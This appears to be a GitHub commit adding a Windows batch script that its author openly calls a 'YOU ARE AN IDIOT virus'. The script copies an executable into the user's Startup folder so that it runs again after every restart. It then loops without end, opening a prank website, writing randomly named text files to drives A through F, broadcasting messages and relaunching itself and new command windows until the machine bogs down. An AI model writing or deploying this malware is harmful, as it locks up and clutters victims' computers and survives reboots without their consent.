b0fb93fcb36dc91df1ec20ad22b045a9d87986de
FOX GAMINGYT <105371123+FoxGamingYTCR@users.noreply.github.com>
2022-06-20 12:35:32 -0400

    YOU ARE AN IDIOT virus ☻☺
    this will create a bunch of files and cause lag. (it will copy itself to the startup folder).

---
+++ YOUAREAMAZING.bat
@@ -0,0 +1,27 @@
+@echo off
+color 40
+copy YOUAREAMAZING.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+title ☺☻YOUAREANIDIOT☺☻
+echo ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+echo ▓                                                                                                      ▓
+echo ▓                                                                                                      ▓
+echo ▓           ☻                                                        ☺                           ▓
+echo ▓                                                                                                      ▓
+echo ▓         YOU             ARE             AN           IDIOT                         ▓
+echo ▓                                                                                                      ▓
+echo ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+:1
+start www.youareanidiot.cc
+echo ☺☻ >> A:\%random%IDIOT%random%.txt
+msg * ☺
+echo ☺☻ >> B:\%random%IDIOT%random%.txt
+echo ☺HAHAHA☻
+echo ☺☻ >> C:\%random%IDIOT%random%.txt
+start YOUAREAMAZING.exe
+echo ☺☻ >> D:\%random%IDIOT%random%.txt
+echo ☺☻ >> E:\%random%IDIOT%random%.txt
+msg * ☻
+echo ☺☻ >> F:\%random%IDIOT%random%.txt
+echo ☺YOU ARE AN IDIOT☻
+start cmd
+goto :1
